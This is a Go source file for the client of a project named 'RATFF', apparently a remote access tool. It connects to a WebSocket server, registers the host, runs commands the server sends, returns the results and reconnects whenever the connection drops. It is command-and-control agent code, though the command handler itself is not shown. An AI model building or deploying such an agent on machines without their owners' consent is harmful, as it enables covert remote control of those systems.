package main

import (
	"encoding/json"
	"time"

	"RATFF/shared"

	"github.com/gorilla/websocket"
	"github.com/sirupsen/logrus"
)

var log *logrus.Entry

// runClient establishes a WebSocket connection and runs the message loop.
func runClient(serverURL, clientID string) error {
	conn, _, err := websocket.DefaultDialer.Dial(serverURL, nil)
	if err != nil {
		return err
	}
	defer conn.Close()

	setupHeartbeat(conn)

	info := shared.BuildClientInfo(clientID)
	msg := shared.NewMessage(shared.MsgRegister, "", clientID, info.ToPayload())
	if err := sendMessage(conn, msg); err != nil {
		return err
	}

	log.WithField("client_id", clientID).Info("Connected to server")

	return messageLoop(conn)
}

// setupHeartbeat configures ping/pong for the WebSocket connection.
func setupHeartbeat(conn *websocket.Conn) {
	_ = conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	conn.SetPongHandler(func(string) error {
		_ = conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		return nil
	})

	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		}
	}()
}

// messageLoop continuously reads and processes messages from the server.
func messageLoop(conn *websocket.Conn) error {
	for {
		var msg shared.Message
		if err := readMessage(conn, &msg); err != nil {
			return err
		}

		resp := executeCommand(msg)

		if err := sendMessage(conn, resp); err != nil {
			return err
		}
	}
}

// sendMessage marshals and sends a message over WebSocket.
func sendMessage(conn *websocket.Conn, msg shared.Message) error {
	data, err := json.Marshal(msg)
	if err != nil {
		return err
	}
	return conn.WriteMessage(websocket.TextMessage, data)
}

// readMessage reads and unmarshals a WebSocket message.
func readMessage(conn *websocket.Conn, msg *shared.Message) error {
	_, data, err := conn.ReadMessage()
	if err != nil {
		return err
	}
	return json.Unmarshal(data, msg)
}

func main() {
	log = shared.InitLogger("info", "text")
	loadConfig()

	serverURL := getServerURL()
	clientID := cfg.ClientID
	if clientID == "" {
		clientID = shared.GenerateClientID()
	}
	cfg.ClientID = clientID

	for {
		if err := runClient(serverURL, clientID); err != nil {
			log.Error("Connection lost: ", err)
		}

		log.Info("Reconnecting...")
		time.Sleep(3 * time.Second)
	}
}
